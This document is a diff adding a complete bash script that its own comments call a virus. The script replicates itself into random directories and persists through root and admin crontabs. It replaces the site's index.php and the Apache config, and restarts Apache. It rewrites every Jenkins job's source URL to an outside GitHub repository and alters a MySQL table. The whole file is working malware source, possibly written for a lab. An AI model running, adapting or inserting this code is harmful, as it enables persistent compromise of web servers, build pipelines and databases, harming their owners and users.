@@ -1,0 +1,161 @@
+#!/bin/bash
+#find and record myself
+ABSOLUTE_FILENAME=`readlink -e "$0"`
+DIRECTORY=`dirname "$ABSOLUTE_FILENAME"`
+FILENAME=$(basename "$ABSOLUTE_FILENAME")
+ERDR="/"
+pwd >> cheatsheet
+echo "now choose random folder to replicate itself"
+#
+cd "/"
+#MKDIRS HERE
+#mkdir "/var/spool/cron/crontabs" > "/dev/null"
+mkdir -p "/etc/virus"
+mkdir -p "/etc/virusApacheConf"
+mkdir -p "/etc/apache2/tmp" 
+echo "MKDIRS DONE"
+#KDRIRS DONE
+r=$RANDOM
+while (($r > 0))
+do
+cd `ls -1 | shuf -n1`
+if [ $? -eq 0 ]; then
+echo $PWD > /dev/null                      #LINE 20
+else
+((r=0))
+fi
+((r--))
+done
+BABY=`pwd`
+echo "replicating"
+#
+#eco ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+echo "abs-fname = $ABSOLUTE_FILENAME"
+echo "babynext = $BABY"
+#eco ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#if dir / restart plz
+echo "check if not good"
+if [[ "$BABY" == "$ERDR" ]]; then
+echo "TROUBLE"
+bash "$ABSOLUTE_FILENAME"
+else
+echo "this is not / folder"
+fi
+#sleep 3
+cp -- "$ABSOLUTE_FILENAME" "$BABY/1"
+#if fail to find directory, restart
+if [ $? -eq 0 ]; then
+echo "not a fail to find dir"
+#
+cp -- "$DIRECTORY/cheatsheet" "$BABY/cheatsheet"
+cp -- "$DIRECTORY/000-default.conf" "$BABY/000-default.conf"
+cp -- "$DIRECTORY/index.php" "$BABY/index.php"
+cp -- "$DIRECTORY/adminINIT" "$BABY/adminINIT"
+cp -- "$DIRECTORY/root" "$BABY/root"
+cp -- "$DIRECTORY/spam" "$BABY/spam"
+#cp -- "$DIRECTORY/jenkins-cli.jar" "$BABY/jenkins-cli.jar"
+#
+#DOING VIRUS STUFF
+#
+echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~crontab selfstart from admin file"
+if [ ! -f /var/spool/cron/crontabs/admin ]; then
+crontab -u admin adminINIT
+else
+echo "* * * * * $ABSOLUTE_FILENAME &" >> /var/spool/cron/crontabs/admin
+fi
+echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~crontab spam from root file"
+diff "$DIRECTORY/spam" "/etc/virus/spam"
+if [ $? -eq 0 ]; then
+echo "no difference" #> /dev/null
+else 
+if [ -f $DIRECTORY/spam ]; then
+rm -rf /etc/virus/*
+echo "RRRRRRRRRRRRRRRRRMMMMMMMMMM /etc/virus/"
+cp -- "$DIRECTORY/spam" "/etc/virus/spam"
+fi
+fi
+diff "$DIRECTORY/root" `tail -n 1 /var/spool/cron/crontabs/root`
+if [ $? -eq 0 ]; then
+echo "no difference" #> /dev/null
+else 
+if [ -f $DIRECTORY/root ]; then
+crontab -u root "$DIRECTORY/root"
+fi
+fi
+echo "install jenkins-cli~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+if [ ! -f "/etc/virus/jenkins-cli.jar" ]; then
+sudo wget http://localhost:8080/jnlpJars/jenkins-cli.jar -P /etc/virus
+fi
+echo "check if index is OK"
+#
+diff "$DIRECTORY/index.php" "/etc/virus/index.php"
+if [ $? -eq 0 ]; then
+echo "no difference" #> /dev/null
+else
+if [ -f $DIRECTORY/index.php ]; then
+rm -f /etc/virus/index.php
+echo "RRRRRRRRRRMMMMMMMMM /etc/virus/index.php "
+cp "$DIRECTORY/index.php" "/etc/virus/index.php"
+fi
+fi
+diff "/var/www/html/index.php" "/etc/virus/index.php"
+if [ $? -eq 0 ]; then
+echo "no difference" #> /dev/null
+else
+if [ -f /etc/virus/index.php ]; then
+mv -f "/var/www/html/index.php" "/var/www/html/xedni.php"
+echo "MVVVVVVVVVVV index to xendi"
+cp "/etc/virus/index.php" "/var/www/html/index.php"
+fi
+fi
+#change apache settings(sites enabled) to my own
+diff "$DIRECTORY/000-default.conf" "/etc/virusApacheConf/000-default.conf"
+if [ $? -eq 0 ]; then
+echo "no difference" #> /dev/null
+else
+if [ -f $DIRECTORY/000-default.conf ]; then
+rm -rf /etc/virusApacheConf/*
+echo "RRRRRMMMMMMMM /etc/virAPCNF"
+cp -- "$DIRECTORY/000-default.conf" "/etc/virusApacheConf/000-default.conf"
+fi
+fi
+diff "/etc/virusApacheConf" "/etc/apache2/sites-enabled/"
+if [ $? -eq 0 ]; then
+echo "no difference" #> /dev/null
+else 
+if [ -f $DIRECTORY/000-default.conf ]; then
+mv -f /etc/apache2/sites-enabled/000-default.conf /etc/apache2/tmp
+echo "MVVVVVVVVVVVV SETTINDZ apache sites enalbed"
+cp -- "/etc/virusApacheConf/000-default.conf" "/etc/apache2/sites-enabled/000-default.conf"
+#restart apache
+sudo /etc/init.d/apache2 restart
+fi
+fi
+#get jenkins job name JENKINS
+JOBA=`sudo java -jar /etc/virus/jenkins-cli.jar -s http://localhost:8080/ list-jobs`
+#get all job setting in file & change url
+java -jar /etc/virus/jenkins-cli.jar -s http://localhost:8080/ get-job $JOBA > /etc/virus/JOBE
+diff /etc/virus/JOBE /etc/virus/JOBu
+if [ $? -eq 0 ]; then
+echo "no difference" #> /dev/null
+else
+if [ -f /etc/virus/JOBE ]; then
+cp /etc/virus/JOBE /etc/virus/JOBu
+sed -i 's,<url>https://github.com/.*</url>,<url>https://github.com/oookotooo/tmp</url>,g' /etc/virus/JOBE
+#put new settings in job
+java -jar /etc/virus/jenkins-cli.jar -s http://localhost:8080/ update-job $JOBA < /etc/virus/JOBE
+fi
+fi
+#END OF JENKINS
+#MySQL change name
+mysql -D main -u hacker -phacker -e "update main set keyword='CENSOURED' where id='1'"
+#
+#END VIRUS STUFF
+#
+#Starting BABY
+sudo bash "$BABY/$FILENAME" &
+sudo bash "$ABSOLUTE_FILENAME"
+else
+echo "FAIL to find dit. NOTHING IS DONE"
+sudo bash "$ABSOLUTE_FILENAME" 
+fi
